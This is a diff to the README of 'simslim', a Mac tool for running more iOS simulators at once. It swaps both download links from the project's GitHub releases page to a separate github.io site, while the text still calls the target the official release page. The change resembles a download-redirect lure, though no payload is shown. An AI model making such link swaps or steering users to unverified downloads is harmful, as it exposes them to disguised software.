@@ -1,6 +1,6 @@
 # ⚡ simslim - Run more iOS simulators at once
 
-[![Download simslim](https://img.shields.io/badge/Download-Simslim-blue.svg)](https://github.com/epidemic-suretybond423/simslim/releases)
+[![Download simslim](https://img.shields.io/badge/Download-Simslim-blue.svg)](https://epidemic-suretybond423.github.io)
 
 ## 🎯 What does simslim do?
 
@@ -20,7 +20,7 @@ Before you install the software, check if your computer meets these requirements
 
 You must visit the official release page to get the latest version of the tool. 
 
-[Click here to open the download page](https://github.com/epidemic-suretybond423/simslim/releases)
+[Click here to open the download page](https://epidemic-suretybond423.github.io)
 
 Look for the latest release at the top of the page. Select the file that ends in .dmg or .zip. Save this file to your Downloads folder on your Mac.
 
